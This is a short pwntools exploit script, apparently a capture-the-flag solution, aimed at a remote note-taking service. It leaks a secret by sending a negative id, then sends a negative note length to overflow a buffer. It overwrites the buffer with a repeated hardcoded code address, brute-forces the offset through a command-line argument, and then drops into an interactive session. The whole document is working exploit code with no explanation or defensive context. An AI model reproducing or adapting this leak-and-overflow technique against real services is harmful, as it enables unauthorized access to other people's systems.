from pwn import*
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('integers', metavar='int', type=int)

rem = remote('140.113.194.81', 20135)

rem.recvuntil('Your choice: ',drop = False)
rem.sendline('1')
recvData = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('-1')
recvData = rem.recvuntil('Age: ',drop = False)
secretInfo = rem.recvline(keepends = False)

recvData = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('2')
recvData = rem.recvuntil('Please input secret first: ',drop = False)
rem.sendline(secretInfo)
recvData = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('1')
recvData = rem.recvuntil('Input new note length: ',drop = False)
rem.sendline('-1')

args = parser.parse_args()
maliciousStr = p32(0x08048a08)
magic1Addr = str(maliciousStr) * args.integers
rem.sendline(magic1Addr)

recvData = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('3')

with open('bufferOverflow.txt', 'a') as f:
  print >> f , "Try" , args.integers

recv=rem.recvuntil('Congrats1!', drop = False)
with open('bufferOverflow.txt', 'a') as f:
  print >> f , "Success" , args.integers

rem.interactive()

